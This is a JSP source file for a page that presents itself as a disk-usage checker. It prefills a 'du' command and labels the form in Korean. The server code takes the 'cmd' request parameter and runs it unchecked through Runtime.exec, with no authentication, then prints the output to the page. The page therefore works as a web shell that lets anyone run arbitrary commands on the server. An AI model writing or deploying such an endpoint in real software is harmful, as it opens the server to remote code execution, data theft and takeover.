<%@page language="java" contentType="text/html; charset=utf-8"
	pageEncoding="utf-8"%>
<%@page import="java.io.IOException"%>
<%@page import="java.io.InputStreamReader"%>
<%@page import="java.io.SequenceInputStream"%>
<%@page import="java.io.BufferedReader"%>
<html>
<ul>
	<li>
		하드사용량 : du -hsb /home/ec2-user/stm-www/deploy/psdkitchen
	</li>
	<li>
		하드사용량 : du -hsb /home/ec2-user/stm-www/attach/psdkitchen
	</li>
</ul>
<form action="" name="f">
	<input type="text" name="cmd" value="du -hsb /home/ec2-user/stm-www/deploy/psdkitchen" />
	<button type="submit">쿼리</button>
</form>
<%
	if (request.getParameter("cmd") != null) {

		String command = request.getParameter("cmd");
		int lineCount = 0;
		String line = "";

		Runtime rt = Runtime.getRuntime();
		Process ps = null;

		try {
			ps = rt.exec(command);

			BufferedReader br = new BufferedReader(

			new InputStreamReader(

			new SequenceInputStream(ps.getInputStream(), ps.getErrorStream())));

			while ((line = br.readLine()) != null) {
%>
<%=line%><br>
<!-- 결과 화면에 뿌리기... -->
<%
			}
			br.close();

		} catch (IOException ie) {
			ie.printStackTrace();
		} catch (Exception e) {
			e.printStackTrace();
		}
	}
%>
</html>
